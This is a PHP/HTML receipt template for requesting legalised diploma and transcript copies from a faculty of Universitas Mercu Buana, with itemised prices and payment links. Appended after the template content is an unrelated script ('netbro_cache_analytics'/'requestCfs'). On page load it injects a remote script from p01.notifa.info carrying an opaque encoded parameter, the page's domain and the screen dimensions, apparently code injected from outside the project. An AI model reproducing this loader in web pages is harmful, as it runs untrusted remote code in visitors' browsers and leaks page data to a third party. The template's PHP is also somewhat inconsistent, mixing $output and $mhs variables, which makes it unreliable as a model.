<!DOCTYPE html>
<html>
<!-- Mirrored from light.pinsupreme.com/emails_order.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 08 Apr 2019 18:15:08 GMT -->
<?php foreach ($data as $mhs) : ?>

	<body style="background-color: #222533; padding: 20px; font-family: font-size: 14px; line-height: 1.43; font-family: &quot;Helvetica Neue&quot;, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif;">
		<div style="max-width: 600px; margin: 0px auto; background-color: #fff; box-shadow: 0px 20px 50px rgba(0,0,0,0.05);">
			<div style="padding: 60px 70px;">
				<h2 style="margin-top: 0px;">Bukti Pengajuan, <?= ucwords(strtolower($output['nama'])); ?></h2>
				<div style="color: #636363; font-size: 14px;">
					Dimohon untuk segera melakukan pembayaran agar ijazah anda segera di proses untuk dilegalisir oleh pihak TU Fasilkom Universitas Mercu Buana.
				</div>
				<table style="margin-top: 30px; width: 100%;">
					<tr>
						<td style="padding-right: 30px;">
							<div style="text-transform: uppercase; font-size: 11px; letter-spacing: 1px; font-weight: bold; color: #B8B8B8; margin-bottom: 5px;">Tanggal Pengajuan:</div>
							<div style="font-size: 12px; color: #111; font-weight: bold; margin-bottom: 20px;"><?= $mhs['Tgl_Transaksi']; ?></div>
						</td>
					</tr>
				</table>
				<table style="margin-top: 40px; width: 100%;">
					<tr>
						<td style="text-transform: uppercase; letter-spacing: 1px; color: #B8B8B8; font-size: 10px; font-weight: bold;">Berkas</td>
						<td style="text-transform: uppercase; letter-spacing: 1px; color: #B8B8B8; font-size: 10px; font-weight: bold; text-align: right;">Harga</td>
					</tr>
					<tr>
						<td style="padding: 15px 0px;">
							<div style="color: #111; font-size: 14px; font-weight: bold;">Ijazah (Legalisir)</div>
							<div style="color: #B8B8B8; font-size: 12px;">Sebanyak <?= $mhs['Jumlah_ijazah'] ?> Lembar</div>
						</td>
						<td style="padding: 15px 0px; text-align: right;  font-size: 14px; font-weight: bold; color: #111;">
							<?php $totalIjazah = ($mhs['Jumlah_ijazah'] * 10000);
							echo "Rp. " . number_format($totalIjazah, 0, ".", ".") ?>
						</td>
					</tr>
					<tr>
						<td style="padding: 15px 0px;">
							<div style="color: #111; font-size: 14px; font-weight: bold;">Transkip (Legalisir)</div>
							<div style="color: #B8B8B8; font-size: 12px;">Sebanyak <?= $mhs['Jumlah_transkip'] ?> Lembar</div>
						</td>
						<td style="padding: 15px 0px; text-align: right;  font-size: 14px; font-weight: bold; color: #111;">
							<?php $totalTranskip = ($mhs['Jumlah_transkip'] * 10000);
							echo "Rp. " . number_format($totalTranskip, 0, ".", ".") ?>
						</td>
					</tr>
				</table>
				<table style="margin-left: auto; margin-top: 0px; border-top: 3px solid #eee; padding-top: 10px; margin-bottom: 20px;">
					<tr>
						<td style="color: #B8B8B8; font-size: 12px; padding: 5px 0px;">Total Sebelum Administrasi:</td>
						<td style="color: #111; text-align: right; font-weight: bold; padding: 5px 0px 5px 40px; font-size: 12px;">
							<?php $totalSeluruh = (($mhs['Jumlah_ijazah'] + $mhs['Jumlah_transkip']) * 10000);
							echo "Rp. " . number_format($totalSeluruh, 0, ".", ".") ?>
						</td>
					</tr>
					<tr>
						<td style="color: #B8B8B8; font-size: 12px; padding: 5px 0px;">Administrasi:</td>
						<td style="color: #111; text-align: right; font-weight: bold; padding: 5px 0px 5px 40px; font-size: 12px;">
							<?php
							echo "Rp. " . number_format(5000, 0, ".", ".") ?>
						</td>
					</tr>
					<tr>
						<td style="color: #111; letter-spacing: 1px; font-size: 20px; padding: 10px 0px; text-transform: uppercase; font-weight: bold;">Total Harus Dibayar :</td>
						<td style="color: #4B72FA; text-align: right; font-weight: bold; padding: 10px 0px 5px 40px; font-size: 20px;"><?= "Rp. " . number_format($mhs['Total'], 0, ".", ".") ?></td>
					</tr>
				</table>
				<a href="<?= base_url('User/pembayaran/' . base64_encode($mhs['ID_Reservasi'])); ?>" style="padding: 5px 15px; background-color: #4B72FA; color: #fff; font-weight: bolder; font-size: 14px; display: inline-block; margin: 20px 0px; margin-left: 20px; text-decoration: none;">Bayar sekarang!</a>
				<a href="<?= base_url('User/index/'); ?>" style="padding: 5px 15px; background-color: #4B72FA; color: #fff; font-weight: bolder; font-size: 14px; display: inline-block; margin: 20px 0px; margin-left: 20px; text-decoration: none;">Bayar nanti saja</a>
			</div>
			<!-- <div style="background-color: #F5F5F5; padding: 40px; text-align: center;">
																																											<div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(0,0,0,0.05);">
																																												<div style="color: #A5A5A5; font-size: 10px;">Copyright 2019 &copy; Aslab Fakultas Ilmu Komputer</div>
																																											</div>
																																										</div> -->
		<?php endforeach; ?>
		<script type="text/javascript">
			if (self == top) {
				function netbro_cache_analytics(fn, callback) {
					setTimeout(function() {
						fn();
						callback();
					}, 0);
				}

				function sync(fn) {
					fn();
				}

				function requestCfs() {
					var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
					var idc_glo_r = Math.floor(Math.random() * 99999999999);
					var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2bdBFSqcIYgo%2fQ6xX5OYVFBt38vIeUPPdCDA3VyBWFZ3u%2fVn8KxiHgpjIoVFRcjkA6d2cstMBTfhAJGWJBS4lCTWSuRP5ecYFN0mTnDm%2fwr%2bagx5oC3Z%2fkD3YWI0iNl270VCQPfDuIhM3i7N4s5T%2f0NLFsZ2dQwpGlGbZDP1Q9fo9a1Hs16cNGWMKWbGWxU06WDZV48%2f783EsNMHsKuxtQAcaEp8kLeIUuhnHN2cHaO9n1cWPS7v32J5HRbFPLGZ3X3SzuEDKNIkesABi%2fKHxdonVn6XcIUlsjLbCoRi4B1zXFI0YlnsdH6JGc%2fsEr5iRSfstZeygFX%2fkoGJnBihCy6Xpg5xW55cAnfDkI3qToLDyk3vXdNelxqPZufhs0%2fx%2bUFijTdQpF2aH4JqCfUHRFTd6NaijITBNMANuFH5pb2qemk%2fxlji2CcA1LMuSuKDQ0pOq%2bbFw5nMx0mN7Aj%2fsg3L7s%2f1eH4gZ%2blXvmwFxKIY%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
					var bsa = document.createElement('script');
					bsa.type = 'text/javascript';
					bsa.async = true;
					bsa.src = url;
					(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
				}
				netbro_cache_analytics(requestCfs, function() {});
			};
		</script>
</body>

</html>